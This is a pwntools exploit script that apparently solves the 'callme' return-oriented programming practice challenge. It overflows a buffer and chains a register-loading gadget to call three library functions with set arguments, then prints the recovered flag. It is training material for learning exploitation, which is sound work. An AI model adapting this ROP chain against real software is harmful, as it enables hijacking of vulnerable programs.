#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'callme')

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def callme_three():
    payload = flat(
        pop_rsi_pop_rdx,
        0xdeadbeefdeadbeef,
        0xcafebabecafebabe,
        0xd00df00dd00df00d,
        exe.plt['callme_three']
    )

    return payload

def callme_two():
    payload = flat(
        pop_rsi_pop_rdx,
        0xdeadbeefdeadbeef,
        0xcafebabecafebabe,
        0xd00df00dd00df00d,
        exe.plt['callme_two']
    )

    return payload

def callme_one():
    payload = flat(
        pop_rsi_pop_rdx,
        0xdeadbeefdeadbeef,
        0xcafebabecafebabe,
        0xd00df00dd00df00d,
        exe.plt['callme_one']
    )

    return payload


def callme():
    global pop_rsi_pop_rdx
    offset = 40
    pop_rsi_pop_rdx = 0x000000000040093c # pop rdi; pop rsi; pop rdx; ret; 


    payload = flat({
        offset: [
            callme_one(),
            callme_two(),
            callme_three()
        ]
    })

    io.sendline(payload)
    io.recvuntil('callme_two()')
    io.recvline()
    flag = io.recv(1024).decode()
    info(f"Flag: {flag}")

    io.close()

def main():
    
    init()
    callme()

if __name__ == '__main__':
    main()

